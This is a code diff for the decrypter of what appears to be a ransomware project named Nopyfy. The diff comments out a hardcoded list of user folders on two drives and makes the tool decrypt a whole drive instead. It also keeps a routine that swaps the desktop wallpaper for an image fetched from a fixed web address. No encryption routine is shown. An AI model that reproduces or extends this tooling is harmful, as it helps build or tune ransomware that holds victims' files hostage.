@@ -27,8 +27,8 @@ namespace Nopyfy_Decrypter
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
         string userName = Environment.UserName;
-        string userDir = "C:\\";
-        string userDir1 = "D:\\";
+        string userDirC = "C:\\";
+        string userDirD = "F:\\";
         string backgroundImageUrl = "http://i.imgur.com/5Yuq9Qv.jpg"; //desktop background picture
         //write Encryption byte above 15 (same thing do in decrypter)
         byte nop_byte = 100;
@@ -134,7 +134,7 @@ namespace Nopyfy_Decrypter
 
         public void changeDesktop()
         {
-            string backgroundImageName = userDir + userName + "\\beautyfull.jpg";
+            string backgroundImageName = userDirC + userName + "\\beautyfull.jpg";
             SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
         }
 
@@ -150,61 +150,62 @@ namespace Nopyfy_Decrypter
             else
             {
                 decrypted = 0;
-                string fullpath_1 = userDir + path_1 + userName + "\\Links";
-                string fullpath_2 = userDir + path_1 + userName + "\\Contacts";
-                string fullpath_3 = userDir + path_1 + userName + "\\Desktop";
-                string fullpath_4 = userDir + path_1 + userName + "\\Documents";
-                string fullpath_5 = userDir + path_1 + userName + "\\Downloads";
-                string fullpath_6 = userDir + path_1 + userName + "\\Pictures";
-                string fullpath_7 = userDir + path_1 + userName + "\\Music";
-                string fullpath_8 = userDir + path_1 + userName + "\\OneDrive";
-                string fullpath_9 = userDir + path_1 + userName + "\\Saved Games";
-                string fullpath_10 = userDir + path_1 + userName + "\\Favorites";
-                string fullpath_11 = userDir + path_1 + userName + "\\Searches";
-                string fullpath_12 = userDir + path_1 + userName + "\\Videos";
+                //string fullpath_1 = userDir + path_1 + userName + "\\Links";
+                //string fullpath_2 = userDir + path_1 + userName + "\\Contacts";
+                //string fullpath_3 = userDir + path_1 + userName + "\\Desktop";
+                //string fullpath_4 = userDir + path_1 + userName + "\\Documents";
+                //string fullpath_5 = userDir + path_1 + userName + "\\Downloads";
+                //string fullpath_6 = userDir + path_1 + userName + "\\Pictures";
+                //string fullpath_7 = userDir + path_1 + userName + "\\Music";
+                //string fullpath_8 = userDir + path_1 + userName + "\\OneDrive";
+                //string fullpath_9 = userDir + path_1 + userName + "\\Saved Games";
+                //string fullpath_10 = userDir + path_1 + userName + "\\Favorites";
+                //string fullpath_11 = userDir + path_1 + userName + "\\Searches";
+                //string fullpath_12 = userDir + path_1 + userName + "\\Videos";
 
-                string fullpath_15 = userDir1 + path_1 + userName + "\\Links";
-                string fullpath_16 = userDir1 + path_1 + userName + "\\Contacts";
-                string fullpath_17 = userDir1 + path_1 + userName + "\\Desktop";
-                string fullpath_18 = userDir1 + path_1 + userName + "\\Documents";
-                string fullpath_19 = userDir1 + path_1 + userName + "\\Downloads";
-                string fullpath_20 = userDir1 + path_1 + userName + "\\Pictures";
-                string fullpath_21 = userDir1 + path_1 + userName + "\\Music";
-                string fullpath_22 = userDir1 + path_1 + userName + "\\OneDrive";
-                string fullpath_23 = userDir1 + path_1 + userName + "\\Saved Games";
-                string fullpath_24 = userDir1 + path_1 + userName + "\\Favorites";
-                string fullpath_25 = userDir1 + path_1 + userName + "\\Searches";
-                string fullpath_26 = userDir1 + path_1 + userName + "\\Videos";
-                DecryptDirectory(fullpath_1);
-                DecryptDirectory(fullpath_2);
-                DecryptDirectory(fullpath_3);
-                DecryptDirectory(fullpath_4);
-                DecryptDirectory(fullpath_5);
-                DecryptDirectory(fullpath_6);
-                DecryptDirectory(fullpath_7);
-                DecryptDirectory(fullpath_8);
-                DecryptDirectory(fullpath_9);
-                DecryptDirectory(fullpath_10);
-                DecryptDirectory(fullpath_11);
-                DecryptDirectory(fullpath_12);
+                //string fullpath_15 = userDir1 + path_1 + userName + "\\Links";
+                //string fullpath_16 = userDir1 + path_1 + userName + "\\Contacts";
+                //string fullpath_17 = userDir1 + path_1 + userName + "\\Desktop";
+                //string fullpath_18 = userDir1 + path_1 + userName + "\\Documents";
+                //string fullpath_19 = userDir1 + path_1 + userName + "\\Downloads";
+                //string fullpath_20 = userDir1 + path_1 + userName + "\\Pictures";
+                //string fullpath_21 = userDir1 + path_1 + userName + "\\Music";
+                //string fullpath_22 = userDir1 + path_1 + userName + "\\OneDrive";
+                //string fullpath_23 = userDir1 + path_1 + userName + "\\Saved Games";
+                //string fullpath_24 = userDir1 + path_1 + userName + "\\Favorites";
+                //string fullpath_25 = userDir1 + path_1 + userName + "\\Searches";
+                //string fullpath_26 = userDir1 + path_1 + userName + "\\Videos";
+                //DecryptDirectory(fullpath_1);
+                //DecryptDirectory(fullpath_2);
+                //DecryptDirectory(fullpath_3);
+                //DecryptDirectory(fullpath_4);
+                //DecryptDirectory(fullpath_5);
+                //DecryptDirectory(fullpath_6);
+                //DecryptDirectory(fullpath_7);
+                //DecryptDirectory(fullpath_8);
+                //DecryptDirectory(fullpath_9);
+                //DecryptDirectory(fullpath_10);
+                //DecryptDirectory(fullpath_11);
+                //DecryptDirectory(fullpath_12);
 
-                DecryptDirectory(fullpath_15);
-                DecryptDirectory(fullpath_16);
-                DecryptDirectory(fullpath_17);
-                DecryptDirectory(fullpath_18);
-                DecryptDirectory(fullpath_19);
-                DecryptDirectory(fullpath_20);
-                DecryptDirectory(fullpath_21);
-                DecryptDirectory(fullpath_22);
-                DecryptDirectory(fullpath_23);
-                DecryptDirectory(fullpath_24);
-                DecryptDirectory(fullpath_25);
-                DecryptDirectory(fullpath_26);
+                //DecryptDirectory(fullpath_15);
+                //DecryptDirectory(fullpath_16);
+                //DecryptDirectory(fullpath_17);
+                //DecryptDirectory(fullpath_18);
+                //DecryptDirectory(fullpath_19);
+                //DecryptDirectory(fullpath_20);
+                //DecryptDirectory(fullpath_21);
+                //DecryptDirectory(fullpath_22);
+                //DecryptDirectory(fullpath_23);
+                //DecryptDirectory(fullpath_24);
+                //DecryptDirectory(fullpath_25);
+                //DecryptDirectory(fullpath_26);
 
-                if (decrypted > 0)
-                {
-                    changeDesktop();
-                }
+                //if (decrypted > 0)
+                //{
+                //    changeDesktop();
+                //}
+                DecryptDirectory(userDirD);
 
                 label4.Visible = false;
 
